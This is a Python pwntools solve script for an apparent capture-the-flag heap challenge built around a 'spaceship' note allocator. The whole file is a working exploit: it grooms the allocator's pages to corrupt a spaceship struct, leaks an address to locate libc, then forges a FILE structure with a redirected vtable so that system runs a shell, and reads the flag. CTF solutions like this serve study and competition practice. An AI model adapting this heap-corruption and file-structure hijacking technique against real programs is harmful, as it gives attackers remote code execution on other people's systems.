from pwn import *

context.arch = 'amd64'

if len(sys.argv) != 2:
    print("Usage: python solve.py <ADDR>:<PORT>")
    exit(0)

url = sys.argv[1].split(":")
p = remote(url[0], int(url[1]))
context.log_level = "error"

libc = ELF("./libc.so.6")

def alloc_spaceship(p: process):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b': ')
    ret = int(p.recvline().strip())
    return ret

def alloc_note(p: process, ship_idx, note_idx, len, note):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(f"{ship_idx}".encode())
    p.recvuntil(b'> ')
    p.sendline(f"{note_idx}".encode())
    p.recvuntil(b'> ')
    p.sendline(f"{len}".encode())
    p.recvuntil(b'> ')
    p.sendline(note)

def free_note(p: process, ship_idx, note_idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(f"{ship_idx}".encode())
    p.recvuntil(b'> ')
    p.sendline(f"{note_idx}".encode())

def take_off(p: process, ship_idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'> ')
    p.sendline(f"{ship_idx}".encode())

idx = alloc_spaceship(p)

for i in range(3):
    alloc_note(p, idx, i, 0x1000, b"RANDOM")

for i in range(3):
    free_note(p, idx, i)

for i in range(2):
    alloc_note(p, idx, i, 0x1000, b'RANDOM')

# Free the entire page from the bitmap
free_note(p, idx, 0)

# Pop one page from ready so the next one is the right one
alloc_note(p, idx, 0, 0x1000, b'RANDOM')

# Fill one page of cache 256, which is the one where spacheships get allocated
idx2 = alloc_spaceship(p)
for i in range(14):
    alloc_note(p, idx2, i, 0x1000//16, b"AAAAAAA")

#The new allocation will take one free page from the bitmap, which will be the currupted one
alloc_note(p, idx2, 14, 0x1000//16, b"AAAAAAA")

#Freeing the note will make it available for the next allocation of 0x1000 cache
free_note(p, idx2, 14)

# This allocation will push the active slop of 0x1000 in full and pop the corrupted page from ready, making it the new active
alloc_note(p, idx, 2, 0x1000, b'AAAAAAA')

# This allocation will take place on the corrupted page, which is also stored in the active of 0x1000
idx3 = alloc_spaceship(p)

# Freeing the note so we can reallocate it and perform the overflow on the newly allocated spaceship!
free_note(p, idx, 2)
alloc_note(p, idx, 2, 0x1000, b'A'*256)

# With this corrupted page we also gain the primitive of arbitrary write
# Now we will have spaceship n. 2 that has the right permission to fligth, giving us the leak to perform the RCE
take_off(p, 2)
p.recvuntil(b'Spaceship n. ')

leak = p.recv(14)
leak = int(leak.decode(), 16)

mem_base = leak - 0x1000 * 10 - 0x100
libc_base = mem_base + 0x1000 * 0x1000 + 0x3000

libc.address = libc_base

stdin = libc.symbols["_IO_2_1_stdout_"]

target_vtable = libc.symbols["_IO_file_jumps"] + 0x360 - 0x38

system = p64(libc.symbols["system"])

free_note(p, idx, 2)

payload = b'\0' * 0x68 + system + b'\0' * (0x200 - 0x70)
payload += p64(stdin) + p64(0) + p64(leak-0x100)
alloc_note(p, idx, 2, 0x1000, payload)

alloc_note(p, idx, 3, 0x100, b'BBBB')

fp = FileStructure()

fp.flags = u64(b" sh" + b'\0'*5)
fp.vtable = target_vtable
fp._lock = libc_base + 0x212050
fp._wide_data = leak + 0x110 - 0xe0
fp.unknown2 = u64(p32(0xffffffff) + b'\x00' * 4) 

alloc_note(p, idx, 4, 0x100, bytes(fp))
p.sendline(b"cat flag")
flag = p.recvuntil(b'}')

print(flag.decode())
